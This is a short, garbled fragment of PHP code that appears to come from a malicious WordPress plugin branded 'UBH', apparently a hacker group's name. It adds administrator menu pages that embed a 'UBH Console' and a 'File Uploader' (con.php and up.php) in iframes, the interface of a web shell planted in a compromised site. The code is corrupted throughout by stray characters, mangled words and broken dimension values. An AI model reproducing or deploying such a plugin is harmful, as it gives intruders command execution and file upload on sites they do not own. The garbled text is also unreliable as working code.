...
add_action("min_menu",function(){add_object_page("UBH","UBH","administrator","ubh",function(){echo "     <div align=\"center">\n     <img src="http://www.ubhteam.org/ima~s/UBHFi�l1.png\"></img>\n     <h1>UniNd BanglaNshi �c�rs</h1>\n     <h2>www.[htZm.org</h2>\n     </div>\n     ";});add_submenu_page("[h","UBH Console","UBH Console","administ*tor","console",function(){echo "        \n        <IFRAME SRC=\"";echo plugins_url("con.php",__FILE__);echo "\" WIDTH=7� HEIGHT��></IFRAME>\n        ";});add_submenu_page("ubh","File Uploader","File Upl�der","administrator","upl�Nr",function(){echo "        \n        <IFRAME SRC="";echo plugins_url("up.php",__FILE__);echo "\" WIDTH�000 HEIGHT�50></IFRAME>\n        \n        ";});});
?>